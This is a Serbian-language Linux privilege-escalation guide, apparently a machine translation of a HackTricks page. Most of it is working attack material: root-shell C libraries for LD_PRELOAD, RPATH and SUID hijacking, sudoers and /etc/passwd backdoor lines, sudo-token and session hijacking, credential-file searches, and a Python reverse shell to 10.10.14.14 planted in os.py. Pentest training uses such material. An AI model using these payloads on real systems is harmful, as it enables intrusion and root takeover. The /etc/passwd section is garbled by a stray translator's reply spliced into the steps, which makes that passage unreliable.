Ako otkrijete da možete **pisati u neki folder iz $PATH** možda ćete moći da eskalirate privilegije tako što ćete **napraviti backdoor u upisivom folderu** pod imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja **nije učitana iz foldera koji se nalazi pre** vašeg upisivog foldera u $PATH.

### SUDO and SUID

Moguće je da vam je dozvoljeno da izvršavate neku komandu koristeći sudo ili da neke komande imaju suid bit. Proverite to koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane naredbe omogućavaju čitanje i/ili pisanje datoteka ili čak izvršavanje komandi.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može dozvoliti korisniku da izvrši komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`; sada je trivijalno dobiti shell dodavanjem ssh key u root direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **set an environment variable** pri izvršavanju nečega:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **zasnovan na HTB machine Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** za učitavanje proizvoljne python biblioteke prilikom izvršavanja skripte kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo: zaobilaženje izvršavanja putem putanja

**Skoči** da pročitaš druge fajlove ili koristi **symlinks**. Na primer u sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), još je lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protumere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez putanje komande

Ako je **sudo dozvola** dodeljena jednoj komandi **bez navođenja putanje**: _hacker10 ALL= (root) less_, možete to iskoristiti menjajući PATH varijablu
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se takođe može koristiti ako **suid** binary **izvršava drugu komandu bez navođenja putanje do nje (uvek proveri pomoću** _**strings**_ **sadržaj čudnog SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary sa putanjom komande

Ako **suid** binary **izvršava drugu komandu navodeći putanju**, onda možete pokušati da kreirate i **export a function** pod imenom komande koju suid fajl poziva.

Na primer, ako suid binary poziva _**/usr/sbin/service apache2 start**_, morate pokušati da kreirate funkciju i exportujete je:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binarni fajl, ova funkcija će biti izvršena

### LD_PRELOAD & **LD_LIBRARY_PATH**

Promenljiva okruženja **LD_PRELOAD** koristi se za navođenje jedne ili više shared biblioteka (.so fajlova) koje loader učitava pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces je poznat kao prethodno učitavanje biblioteke.

Međutim, kako bi se održala sigurnost sistema i sprečilo zloupotrebljavanje ove funkcije, naročito kod **suid/sgid** izvršnih fajlova, sistem nameće određene uslove:

- Loader ignoriše **LD_PRELOAD** za izvršne fajlove kod kojih stvarni korisnički ID (_ruid_) nije isti kao efektivni korisnički ID (_euid_).
- Za izvršne fajlove sa suid/sgid, samo biblioteke u standardnim putanjama koje su takođe suid/sgid se prethodno učitavaju.

Do eskalacije privilegija može doći ako imate mogućnost izvršavanja komandi sa `sudo` i izlaz `sudo -l` uključuje izjavu **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da promenljiva okruženja **LD_PRELOAD** opstane i bude prepoznata čak i kada se komande pokreću sa `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvajte kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **kompajlirajte ga** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na kraju, **escalate privileges** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc se može zloupotrebiti ako napadač kontroliše **LD_LIBRARY_PATH** env variable jer on kontroliše putanju u kojoj će se biblioteke tražiti.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID binarni fajl – .so injection

Kada naiđete na binarni fajl sa **SUID** dozvolama koji deluje neuobičajeno, dobra je praksa proveriti da li ispravno učitava **.so** fajlove. To se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, susretanje greške kao što je _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na potencijal za eksploataciju.

Da bi se ovo eksploatisalo, treba napraviti C fajl, na primer _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, nakon što se kompajlira i izvrši, ima za cilj eskalaciju privilegija manipulacijom dozvola fajlova i izvršavanjem shell-a sa povišenim privilegijama.

Kompajlirajte gore navedeni C fajl u shared object (.so) fajl sa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na kraju, pokretanje pogođenog SUID binary-a trebalo bi da pokrene exploit, omogućavajući potencijalno kompromitovanje sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binary koji učitava biblioteku iz foldera u koji možemo pisati, kreirajmo biblioteku u tom folderu sa odgovarajućim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali treba da sadrži funkciju nazvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koje napadač može iskoristiti za zaobilaženje lokalnih bezbednosnih ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete **samo ubacivati argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih fajlova koje se mogu zloupotrebiti za izlazak iz ograničenih shell-ova, eskalaciju ili održavanje povišenih privilegija, prenos fajlova, pokretanje bind i reverse shell-ova, i olakšavanje drugih post-exploitation zadataka.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15mins** (po defaultu to je trajanje sudo tokena koji nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga otpremiti)

(Možete privremeno omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno izmenom `/etc/sysctl.d/10-ptrace.conf` i postavljanjem `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Drugi exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **owned by root with setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Treći exploit** (`exploit_v3.sh`) će **kreirati sudoers file** koji čini **sudo tokens večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **prava za pisanje** u direktorijumu ili na bilo kom od fajlova kreiranih u tom direktorijumu, možete koristiti binarni [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\
Na primer, ako možete prepisati fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID-om 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku tako što ćete:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Datoteka `/etc/sudoers` i datoteke unutar `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i kako. Ove datoteke **po defaultu mogu biti pročitane samo od strane korisnika root i grupe root**.\
**Ako** možete **pročitati** ovu datoteku, mogli biste uspeti da **dobijete neke zanimljive informacije**, a ako možete **upisati** bilo koju datoteku moći ćete **eskalirati privilegije**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možeš da pišeš, možeš zloupotrebiti ovu dozvolu.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način zloupotrebe ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative za `sudo` binary, kao što je `doas` za OpenBSD — ne zaboravite da proverite njegovu konfiguraciju u `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da se **korisnik obično povezuje na mašinu i koristi `sudo`** da eskalira privilegije i imate shell u tom korisničkom kontekstu, možete **kreirati novi sudo izvršni fajl** koji će izvršiti vaš kod kao root, a zatim komandu korisnika. Zatim **izmenite $PATH** korisničkog konteksta (na primer dodavanjem novog puta u .bash_profile) tako da kada korisnik pokrene sudo, izvrši se vaš sudo izvršni fajl.

Imajte na umu da ako korisnik koristi drugi shell (ne bash) moraćete da izmenite druge fajlove da dodate novi path. Na primer [sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Možete naći još jedan primer u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečeg poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljene biblioteke

### ld.so

Fajl `/etc/ld.so.conf` pokazuje **odakle potiču učitane konfiguracione datoteke**. Obično ovaj fajl sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će biti pročitane konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf`. Ove konfiguracione datoteke **pokazuju na druge foldere** u kojima će se **biblioteke** **tražiti**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima prava za pisanje** na bilo koju od naznačenih putanja: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo koju datoteku unutar `/etc/ld.so.conf.d/` ili bilo koji folder naveden u konfiguracionim datotekama `/etc/ld.so.conf.d/*.conf` on može uspeti da eskalira privilegije.\

Pogledajte **how to exploit this misconfiguration** na sledećoj strani:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem biblioteke u `/var/tmp/flag15/`, program će je koristiti na ovom mestu, kako je navedeno u promenljivoj `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

U direktorijumu, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban da **nadjača the traditional ugo/rwx permissions**. Ove dozvole poboljšavaju kontrolu pristupa fajlu ili direktorijumu tako što omogućavaju ili uskraćuju prava određenim korisnicima koji nisu vlasnici niti članovi grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pronađite** fajlove sa određenim ACL-ovima iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sessions

U **old versions** možete **hijack** neku **shell** session drugog korisnika (**root**).\
U **newest versions** moći ćete da se **connect** na screen sessions samo kao **your own user**. Međutim, možete pronaći **interesting information inside the session**.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Priključi se na sesiju**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Otmica tmux sesija

Ovo je bio problem sa **starim verzijama tmux-a**. Nisam mogao da otmem tmux (v2.1) sesiju koju je kreirao root kao neprivilegovan korisnik.

**Prikaži tmux sesije**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Priključi se na session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** za primer.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na sistemima zasnovanim na Debianu (Ubuntu, Kubuntu, itd.) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovom ranjivošću.\
Ova greška nastaje prilikom kreiranja novog ssh ključa na tim OS-ovima, jer je **bilo moguće samo 32.768 varijacija**. To znači da se sve mogućnosti mogu izračunati i **posedujući ssh public key možete potražiti odgovarajući private key**. Izračunate mogućnosti možete naći ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Specificira da li je password authentication dozvoljen. Podrazumevano je `no`.
- **PubkeyAuthentication:** Specificira da li je public key authentication dozvoljen. Podrazumevano je `yes`.
- **PermitEmptyPasswords**: Kada je password authentication dozvoljen, specificira da li server dozvoljava prijavu na naloge sa praznim password stringovima. Podrazumevano je `no`.

### PermitRootLogin

Specificira da li root može da se prijavi koristeći ssh, podrazumevano je `no`. Moguće vrednosti:

- `yes`: root može da se prijavi koristeći password i private key
- `without-password` or `prohibit-password`: root se može prijaviti samo pomoću private key
- `forced-commands-only`: root se može prijaviti samo koristeći private key i ako su opcije commands specificirane
- `no` : ne

### AuthorizedKeysFile

Specificira fajlove koji sadrže public keys koji se mogu koristiti za user authentication. Može sadržati tokene poput `%h`, koji će biti zamenjen home direktorijumom. **Možete navesti apsolutne putanje** (koje počinju sa `/`) ili **relativne putanje od korisnikovog home-a**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija označava da, ako pokušate da se prijavite sa **private** key korisnika "**testusername**", ssh će uporediti public key vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **use your local SSH keys instead of leaving keys** (without passphrases!) na vašem serveru. Dakle, moći ćete da **jump** putem ssh **to a host** i odatle **jump to another** host **using** the **key** koji se nalazi na vašem **initial host**.

Treba da podesite ovu opciju u `$HOME/.ssh.config` ovako:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` postavljen na `*`, svaki put kada korisnik pređe na drugu mašinu, ta mašina će moći da pristupi ključevima (što predstavlja bezbednosni problem).

Fajl `/etc/ssh_config` može **prepisati** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.\
Fajl `/etc/sshd_config` može **dozvoliti** ili **zabraniti** ssh-agent forwarding pomoću ključne reči `AllowAgentForwarding` (default is allow).

Ako otkrijete da je Forward Agent konfiguran u okruženju, pročitajte sledeću stranicu, jer **možda ćete moći da iskoristite to za eskalaciju privilegija**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljive datoteke

### Datoteke profila

Fajl `/etc/profile` i fajlovi pod `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novi shell**. Dakle, ako možete **upisati ili izmeniti bilo koji od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe neka sumnjiva skripta profila, trebalo bi je proveriti zbog **osetljivih detalja**.

### Passwd/Shadow Files

U zavisnosti od OS-a fajlovi `/etc/passwd` i `/etc/shadow` mogu imati drugačije ime ili može postojati rezervna kopija. Zato se preporučuje **pronaći ih sve** i **proveriti da li ih možete pročitati** kako biste videli **da li se u fajlovima nalaze hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Ponekad možete pronaći **password hashes** u fajlu `/etc/passwd` (ili ekvivalentnom).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Upisiv /etc/passwd

Prvo generišite lozinku pomoću jedne od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Molim pošaljite sadržaj fajla src/linux-hardening/privilege-escalation/README.md koji treba da prevedem.

Takođe pojasnite šta tačno želite u vezi sa korisnikom:
- Da li želite da u prevedeni README ubacim napomenu/komandu koja dodaje korisnika hacker i generisanu lozinku?
- Ili želite da vam samo dam tačne komande koje treba da pokrenete na svom sistemu (ne mogu da ih izvršim umesto vas)?

Ako želite, odmah mogu da generišem sigurnu lozinku (npr. 16 karaktera) i vratim je zajedno sa komandama, npr.:
sudo useradd -m -s /bin/bash hacker
echo 'hacker:<GENERISANA_LOZINKA>' | sudo chpasswd
sudo usermod -aG sudo hacker  (opciono)

Recite koju opciju želite i pošaljite sadržaj fajla.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Na primer: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete da koristite komandu `su` sa `hacker:hacker`

Alternativno, možete da koristite sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: možete narušiti trenutnu bezbednost mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi na `/etc/pwd.db` i `/etc/master.passwd`, takođe `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Treba da proverite da li možete **pisati u neke osetljive fajlove**. Na primer, da li možete pisati u neki **servisni konfiguracioni fajl**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na пример, ако машина покреће **tomcat** server и можете **изменити Tomcat service configuration file inside /etc/systemd/,** онда можете изменити линије:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor biće izvršen sledeći put kada se tomcat pokrene.

### Proverite foldere

Sledeći folderi mogu sadržati backups ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Čudne lokacije/Owned fajlovi
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Датотеке измењене у последњих неколико минута
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB fajlovi
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries u PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **više mogućih datoteka koje bi mogle sadržavati lozinke**.\
**Još jedan interesantan alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koji je aplikacija otvorenog koda koja se koristi za izdvajanje velikog broja lozinki sa lokalnog računara za Windows, Linux & Mac.

### Logovi

Ako možete čitati logove, možda ćete moći pronaći **zanimljive/poverljive informacije u njima**. Što je log čudniji, to će verovatno biti zanimljiviji.\
Takođe, neke "**bad**" konfigurisane (backdoored?) **audit logs** mogu vam omogućiti da **zabeležite lozinke** unutar audit logova, kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste čitali logove, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) biće zaista korisna.

### Shell fajlovi
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Treba takođe da proverite datoteke koje u svom **imenu** ili u **sadržaju** sadrže reč "**password**", kao i da tražite IPs i emails u logs, ili hashes regexps.\
Neću ovde nabrajati kako se sve to radi, ali ako vas zanima možete proveriti poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) izvršava.

## Datoteke dostupne za pisanje

### Python library hijacking

Ako znate **odakle** će se python script izvršavati i možete **pisati u** taj folder ili možete **izmeniti python libraries**, možete izmeniti OS library i backdoor it (ako možete pisati tamo gde će se python script izvršavati, kopirajte i nalepite os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate eksploatacija

Ranjivost u `logrotate` omogućava korisnicima sa **write permissions** na log fajl ili njegovim nadređenim direktorijumima da potencijalno dobiju povišene privilegije. To je zato što `logrotate`, često pokrenut kao **root**, može biti manipulisano da izvrši proizvoljne fajlove, posebno u direktorijumima poput _**/etc/bash_completion.d/**_. Važno je proveriti permisije ne samo u _/var/log_ nego i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost utiče na `logrotate` verziju `3.18.0` i starije

